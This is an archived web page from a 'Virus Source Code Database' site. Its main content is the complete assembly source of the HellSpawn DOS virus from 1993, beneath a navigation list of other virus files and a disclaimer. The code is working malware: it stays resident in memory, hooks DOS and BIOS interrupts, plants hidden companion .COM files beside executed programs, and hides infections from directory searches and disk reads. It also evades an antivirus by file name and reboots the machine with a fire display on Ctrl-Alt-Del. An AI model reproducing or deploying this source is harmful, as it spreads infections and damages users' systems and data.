<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: hspawn__asm</title>
<meta name="KEYWORDS" content="hspawn_.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for hspawn_.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="hack-83_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack-83_asm.php">hack-83_asm</a><br>
<a href="hack_res_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack_res_asm.php">hack_res_asm</a><br>
<a href="hack-res_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack-res_asm.php">hack-res_asm</a><br>
<a href="hacktc2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktc2_asm.php">hacktc2_asm</a><br>
<a href="hacktic2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic2_asm.php">hacktic2_asm</a><br>
<a href="hacktic__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic__asm.php">hacktic__asm</a><br>
<a href="hacktic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic_asm.php">hacktic_asm</a><br>
<a href="hacktic_bat.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic_bat.php">hacktic_bat</a><br>
<a href="halechen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/halechen_asm.php">halechen_asm</a><br>
<a href="hamster_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hamster_asm.php">hamster_asm</a><br>
<a href="hamtlite_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hamtlite_asm.php">hamtlite_asm</a><br>
<a href="hanm2249_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2249_asm.php">hanm2249_asm</a><br>
<a href="hanm2314_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2314_asm.php">hanm2314_asm</a><br>
<a href="hanm2350_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2350_asm.php">hanm2350_asm</a><br>
<a href="hanm2400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2400_asm.php">hanm2400_asm</a><br>
<a href="hanm2449_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2449_asm.php">hanm2449_asm</a><br>
<a href="hanm2467_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2467_asm.php">hanm2467_asm</a><br>
<a href="hanm2471_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2471_asm.php">hanm2471_asm</a><br>
<a href="hanm2501_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2501_asm.php">hanm2501_asm</a><br>
<a href="hanm2564_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2564_asm.php">hanm2564_asm</a><br>
<a href="hanm2567_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2567_asm.php">hanm2567_asm</a><br>
<a href="hanm2592_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2592_asm.php">hanm2592_asm</a><br>
<a href="hanm2602_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2602_asm.php">hanm2602_asm</a><br>
<a href="hanm2626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2626_asm.php">hanm2626_asm</a><br>
<a href="hanm2714_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2714_asm.php">hanm2714_asm</a><br>
<a href="hanm2715_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2715_asm.php">hanm2715_asm</a><br>
<a href="hanm2848_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2848_asm.php">hanm2848_asm</a><br>
<a href="happynyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/happynyb_asm.php">happynyb_asm</a><br>
<a href="harakiri_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/harakiri_pas.php">harakiri_pas</a><br>
<a href="hate_213_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hate_213_asm.php">hate_213_asm</a><br>
<a href="hate-213_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hate-213_asm.php">hate-213_asm</a><br>
<a href="hause_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hause_asm.php">hause_asm</a><br>
<a href="havoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/havoc_asm.php">havoc_asm</a><br>
<a href="hcktic2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hcktic2_asm.php">hcktic2_asm</a><br>
<a href="header_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/header_asm.php">header_asm</a><br>
<a href="heeva_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/heeva_asm.php">heeva_asm</a><br>
<a href="heevahav_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/heevahav_asm.php">heevahav_asm</a><br>
<a href="hellowen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hellowen_asm.php">hellowen_asm</a><br>
<a href="hemlock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hemlock_asm.php">hemlock_asm</a><br>
<a href="hh_h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh_h_asm.php">hh_h_asm</a><br>
<a href="hh&amp;h__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh&h__asm.php">hh&h__asm</a><br>
<a href="hh&amp;h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh&h_asm.php">hh&h_asm</a><br>
<a href="hianmit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hianmit_asm.php">hianmit_asm</a><br>
<a href="hidos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hidos_asm.php">hidos_asm</a><br>
<a href="highland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/highland_asm.php">highland_asm</a><br>
<a href="hiperion_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiperion_asm.php">hiperion_asm</a><br>
<a href="hitler_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hitler_asm.php">hitler_asm</a><br>
<a href="hiv__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv__asm.php">hiv__asm</a><br>
<a href="hiv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv_asm.php">hiv_asm</a><br>
<a href="hiv-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv-b_asm.php">hiv-b_asm</a><br>
<a href="homecmng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/homecmng_asm.php">homecmng_asm</a><br>
<a href="horns_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horns_asm.php">horns_asm</a><br>
<a href="horsb410_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsb410_asm.php">horsb410_asm</a><br>
<a href="horsboo1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsboo1_asm.php">horsboo1_asm</a><br>
<a href="horsboo3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsboo3_asm.php">horsboo3_asm</a><br>
<a href="horse2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse2_asm.php">horse2_asm</a><br>
<a href="horse5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse5_asm.php">horse5_asm</a><br>
<a href="horse8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse8_asm.php">horse8_asm</a><br>
<a href="horse__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse__asm.php">horse__asm</a><br>
<a href="horse_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse_asm.php">horse_asm</a><br>
<a href="howard__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/howard__asm.php">howard__asm</a><br>
<a href="howard_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/howard_asm.php">howard_asm</a><br>
<a href="hspawn__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hspawn__asm.php">hspawn__asm</a><br>
<a href="hspawn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hspawn_asm.php">hspawn_asm</a><br>
<a href="htc_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/htc_pas.php">htc_pas</a><br>
<a href="humgree__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/humgree__asm.php">humgree__asm</a><br>
<a href="humgreed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/humgreed_asm.php">humgreed_asm</a><br>
<a href="hydra_0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_0_asm.php">hydra_0_asm</a><br>
<a href="hydra-0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-0_asm.php">hydra-0_asm</a><br>
<a href="hydra_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_1_asm.php">hydra_1_asm</a><br>
<a href="hydra-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-1_asm.php">hydra-1_asm</a><br>
<a href="hydra_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_2_asm.php">hydra_2_asm</a><br>
<a href="hydra-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-2_asm.php">hydra-2_asm</a><br>
<a href="hydra2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra2_asm.php">hydra2_asm</a><br>
<a href="hydra_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_3_asm.php">hydra_3_asm</a><br>
<a href="hydra-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-3_asm.php">hydra-3_asm</a><br>
<a href="hydra3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra3_asm.php">hydra3_asm</a><br>
<a href="hydra_4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_4_asm.php">hydra_4_asm</a><br>
<a href="hydra-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-4_asm.php">hydra-4_asm</a><br>
<a href="hydra_5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_5_asm.php">hydra_5_asm</a><br>
<a href="hydra-5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-5_asm.php">hydra-5_asm</a><br>
<a href="hydra_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_6_asm.php">hydra_6_asm</a><br>
<a href="hydra-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-6_asm.php">hydra-6_asm</a><br>
<a href="hydra_7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_7_asm.php">hydra_7_asm</a><br>
<a href="hydra-7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-7_asm.php">hydra-7_asm</a><br>
<a href="hydra_8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_8_asm.php">hydra_8_asm</a><br>
<a href="hydra-8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-8_asm.php">hydra-8_asm</a><br>
<a href="hydra8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra8_asm.php">hydra8_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;                HellSpawn Virus (c) 1993 by Stormbringer
;
;
;                                                   า  Stormbringer
;                                                 ออออออออออออออออฤฤฤฤฤ
;                                                   ะ
.model tiny
.radix 16
.code
        org 100
start:
        jmp     EntryPoint        

FindZero:        
        lodsb
        or      al,al
        jne     FindZero
        
        cmp     ds:[si-4],'XE'
        je      InfectOnOpen
        
        cmp     ds:[si-4],'OC'
        jne     Doneopen

OpenRequestedFile:
        mov     ax,3d00
        pushf
        call    dword ptr cs:[IP_21]
        xchg    bx,ax
        
        xor     cx,cx
        xor     dx,dx
        mov     ax,4202
        call    FakeInt21

        cmp     ax,endmain-start
        jne     CloseUp

        pop     di si ds es dx cx bx ax
        stc
        retf    002

CloseUp:
        jc      CloseUp
        mov     ah,3e
        call    FakeInt21
doneOPen:
        pop     di si ds es dx cx bx ax
        jmp     Go21

InfectOnOpen:
        pop     di si ds es dx cx bx ax
        jmp     Execute

NewOpen:
        push    ax bx cx dx es ds si di
        mov     dx,si
        jmp     FindZero
Open:
        push    ax bx cx dx es ds si di
        mov     si,dx
        jmp     FindZero

Terminateprog:
        mov     byte ptr cs:[StealthOn],1
        jmp     Go21


Int21:
        cmp     ah,4c
        je      Terminateprog
        or      ah,ah
        je      Terminateprog
        cmp     byte ptr cs:[StealthOn],0
        je      AfterStealthChecks
        cmp     ah,11h
        je      FindFile
        cmp     ah,12h
        je      FindFile
        cmp     ah,4eh
        je      FindHandle
        cmp     ah,4fh
        je      FindHandle

AfterStealthChecks:       
        cmp     ax,6c00
        je      NewOpen
        cmp     ah,3dh
        je      Open
        cmp     ax,4b00h
        jne     Go21
        jmp     Execute

Go21:        
        jmp     dword ptr cs:[IP_21]

FindHandle:
        pushf
        call    dword ptr cs:[IP_21]
        jc      ErrorHandleCall

        push    ax bx cx dx es ds si di
GetDTA:        
        mov     ah,2f
        call    FakeInt21

        cmp     word ptr es:[bx+1a],endmain-start       ;Check size
        jne     EndHandle

        mov     ah,byte ptr es:[bx+15]
        and     ah,2
        jz      Endhandle
        
        pop     di si ds es dx cx bx ax
        
        mov     ah,4f
        jmp     FindHandle

EndHandle:
        pop     di si ds es dx cx bx ax
        clc
DoneHandleStealth:
        retf    02

ErrorHandleCall:
        mov     ah,12
        retf    02

FindFile:
        call    FakeInt21
        cmp     al,0ff
        je      ErrorFF
        
Stealth:
        push    ax bx cx dx es ds si di
        
        mov     ah,2f
        call    FakeInt21

        cmp     byte ptr es:[bx],0ff
        jne     NotExtended
        add     bx,7
NotExtended:
        
        cmp     word ptr [bx+9],'OC'
        jne     DoneFF
        cmp     word ptr [bx+1dh],endmain-start
        jne     DoneFF

FindNextFile:                
        pop     di si ds es dx cx bx ax
        mov     ah,12
        jmp     FindFile

DoneFF:
        pop     di si ds es dx cx bx ax
        iret

ErrorFF:
        mov     al,0ff
        iret


Execute:
        push    ax bx cx dx es ds si di
        
        call    SetCritical        

        mov     si,dx
FindEndOfFilename:        
        lodsb
        or      al,al
        jne     FindEndOfFilename
        
CheckForCHKDSK:
        cmp     word ptr ds:[si-9],'DK'
        jne     AfterChkdsk

        mov     byte ptr cs:[StealthOn],0
        
AfterChkdsk:
        cmp     byte ptr ds:[si-0a],'-' ;If it's f-prot, exit
        je      EndExec

        cmp     word ptr ds:[si-4],'XE'
        jne     EndExec

        mov     si,dx
        mov     di,offset filename
        push    cs
        pop     es

CopyFilename:        
        lodsb
        stosb
        or      al,al
        jne     CopyFilename
        
        push    cs
        pop     ds

ChangeToCom:
        mov     word ptr es:[di-4],'OC'
        mov     byte ptr es:[di-2],'M'

CheckIfThere:
        mov     ax,3d00
        mov     dx,offset filename
        call    FakeInt21
        xchg    bx,ax
        jnc     CloseVirus

PlaceVirus:
        mov     ah,3c
        mov     cx,2
        mov     dx,offset Filename
        call    FakeInt21
        jc      EndEXEC

WriteVirus:
        inc     byte ptr [InfectionCounter]
        xchg    bx,ax       
        mov     ah,40
        mov     cx,endmain-start
        mov     dx,100
        call    FakeInt21

CloseVirus:
        mov     ah,3e
        call    FakeInt21

EndExec:
        call    ResetCritical

        pop     di si ds es dx cx bx ax
        jmp     Go21


Error13:
        stc
        retf    02

Int13:        
        cmp     ah,02        
        je      IsDiskRead
        jmp     GoInt13

IsDiskRead:
        pushf
        call    dword ptr cs:[IP_13]
        jc      Error13
AbsStealth:
        push    ax bx cx dx es ds si di
        push    cs
        pop     ds
        mov     di,bx
        mov     si,100
        mov     cx,100
        repz    cmpsb
        jcxz    IsVirus
        jmp     DoneAbsStealth
IsVirus:
        mov     di,bx
        mov     ax,9090
        mov     cx,0fe
        repnz   stosw
        mov     ax,20cdh
        stosw

DoneAbsStealth:
        pop     di si ds es dx cx bx ax
        clc
        retf    002

EntryPoint:
        push    ds
        mov     ax,ds        
        dec     ax
        mov     ds,ax
        mov     byte ptr ds:[0],'Z'     ;Mark as last in chain
        sub     word ptr ds:[03],80     ;Allocate Space From MCB (2k)
        sub     word ptr ds:[12],80     ;Allocate Space From PSP (2k)
        xor     ax,ax        
        mov     ds,ax
        dec     word ptr ds:[413]       ;Allocate Memory From Bios (2k)
        dec     word ptr ds:[413]      
        mov     ax,word ptr ds:[413]
        
CopyVirusToMem:        
        mov     cl,6
        shl     ax,cl
        sub     ax,10
        mov     es,ax
        pop     ds
        push    ds
        mov     si,100        
        mov     di,100
        mov     cx,end_prog-start
        repnz   movsb
        
;BX = IP of new int, CX = CS, DX = IntNum
;DI = address of interrupt storage
SetInterrupts:
        xor     ax,ax
        mov     ds,ax
        cli
SetInt21:        
        mov     ax,offset Int21
        mov     bx,es
        xchg    ax,word ptr ds:[21*4]
        xchg    bx,word ptr ds:[21*4+2]
        mov     word ptr es:[IP_21],ax
        mov     word ptr es:[CS_21],bx
SetInt13:
        mov     ax,offset Int13
        mov     bx,es
        xchg    ax,word ptr ds:[13*4]
        xchg    bx,word ptr ds:[13*4+2]
        mov     word ptr es:[IP_13],ax
        mov     word ptr es:[CS_13],bx
SetInt10:        
        mov     ax,offset Int10
        mov     bx,es
        xchg    ax,word ptr ds:[10*4]
        xchg    bx,word ptr ds:[10*4+2]
        mov     word ptr es:[IP_10],ax
        mov     word ptr es:[CS_10],bx
SetInt1c:        
        mov     ax,offset Int1c
        mov     bx,es
        xchg    ax,word ptr ds:[1c*4]
        xchg    bx,word ptr ds:[1c*4+2]
        mov     word ptr es:[IP_1c],ax
        mov     word ptr es:[CS_1c],bx

SetInt09:
        mov     ax,offset Int09
        mov     bx,es
        xchg    ax,word ptr ds:[09*4]
        xchg    bx,word ptr ds:[09*4+2]
        mov     word ptr es:[IP_09],ax
        mov     word ptr es:[CS_09],bx
        sti

        push    cs
        pop     ds

        mov     byte ptr cs:[StealthOn],1

RunOriginalProgram:
        mov     ax,ds:[2c]
        mov     ds,ax
        xor     si,si

FindPath:        
        lodsw
        or      ax,ax
        je      FoundPath
        dec     si
        jmp     FindPath

FoundPath:        
        lodsw

ChangeFilenameToEXE:        
        push    ds
        pop     es
        mov     di,si
        xor     al,al
        mov     cx,0ff
        repnz   scasb
        mov     word ptr es:[di-4],'XE'
        mov     byte ptr es:[di-2],'E'
        
        push    cs
        pop     es
        mov     ah,4a
        mov     bx,(end_prog-start+10f)/10
        int     21

        mov     cx,di
        sub     cx,si
        dec     cx
        mov     di,offset Filename
        mov     al,cl
        stosb
        repnz   movsb
        mov     byte ptr es:[di],0dh
        mov     si,offset Filename
        push    cs
        pop     ds

        int     2e                      ;Execute Command        
        
        mov     ax,4c00
        int     21

FakeInt21:
        pushf
        call    dword ptr cs:[IP_21]
        ret


SetCritical:
        push    ax bx ds
        xor     ax,ax
        mov     ds,ax
        mov     ax,offset CriticalHandler
        mov     bx,cs
        cli
        xchg    ds:[24*4],ax
        xchg    ds:[24*4+2],bx
        mov     word ptr cs:[CS_24],bx
        mov     word ptr cs:[IP_24],ax
        sti
        pop     ds bx ax
        ret

ResetCritical:
        push    ax bx ds
        xor     ax,ax
        mov     ds,ax
        mov     ax,word ptr cs:[IP_24]
        mov     bx,word ptr cs:[CS_24]
        cli
        mov     word ptr ds:[24*4],ax
        mov     word ptr ds:[24*4+2],bx
        sti
        pop     ds bx ax
        ret



CriticalHandler:
        mov     al,3
        iret

Credits db      'HellSpawn v0.91a (c) 1993 by Stormbringer'
EndCred:

Int10:
        cmp     ah,0
        jne     GoInt10
        mov     byte ptr cs:[FireActive],0
        cmp     al,13
        jne     GoInt10
        mov     byte ptr cs:[FireActive],1
GoInt10:
        db      0ea
IP_10   dw      0
CS_10   dw      0


Int09:
        push    ax
        in      al,60h
        cmp     al,53h
        je      IsDel
NotCtrlAltDel:  
        pop     ax                                                 
GoInt09:              
        db      0ea
IP_09   dw      0
CS_09   dw      0

IsDel:
        mov     ah,2
        int     16
        and     al,1100b
        cmp     al,0c
        jne     NotCtrlAltDel
RebootActivation:
        mov     di,0b800
        mov     es,di
        push    cs
        pop     ds
        mov     si,offset Fire
        mov     ax,03
        int     10
        mov     di,550
        
        mov     cx,7
BtBigLoop:        
        push    cx

BtDrawFireLine:
        mov     cx,8
   FireLine:        
        lodsb
        mov     ah,''
        xchg    ah,al
        stosw
        loop    FireLine

        pop     cx
        add     di,90
        loop    BtBigLoop

ColdBoot:
        db      0ea
        db      0,0,0ff,0ff


Int1c:
        cmp     byte ptr cs:[FireActive],1
        jne     JmpInt1c
        push    ax bx cx dx es ds si di
        call    DrawFire
        call    ReverseFlame
        pop     di si ds es dx cx bx ax 
JmpInt1c:
        db      0ea
IP_1c   dw      0
CS_1c   dw      0

DrawFire:
        push    cs
        pop     ds
        mov     si,offset Fire
        mov     di,0a000
        mov     es,di
        xor     di,di
        mov     cx,7
  FireLoop:
        push    cx
        mov     cx,8
        repnz   movsb

        add     di,312d
        pop     cx
        loop    FireLoop
        ret

ReverseFlame:
        push    cs cs
        pop     es ds
        mov     si,offset Fire
        mov     cx,7
FlipAll:
        push    cx
        mov     cx,4
        mov     di,si
        add     di,7
 FlipLine:
        mov     al,byte ptr [si]
        xchg    al,byte ptr [di]
        mov     byte ptr [si],al
        dec     di
        inc     si
        loop    FlipLine
        pop     cx
        loop    FlipAll
        ret
Fire:
        db      00,04,00,00,00,00,00,00
        db      00,04,0c,04,00,00,00,00
        db      00,00,04,0c,04,00,00,00
        db      00,00,04,0c,04,04,00,00
        db      00,00,04,0e,0c,04,00,00
        db      00,04,04,0c,0e,0c,04,00
        db      04,04,0c,0e,0f,0c,0c,04

FireActive      db      0

InfectionCounter    db  0

GoInt13:
        db      0ea
endmain:
IP_13   dw      ?
CS_13   dw      ?
IP_21   dw      ?
CS_21   dw      ?
CS_24   dw      ?
IP_24   dw      ?

StealthOn       db      ?
filename        db      50 dup(?)
end_prog:
end start

</textarea></td></tr></table></body></html>
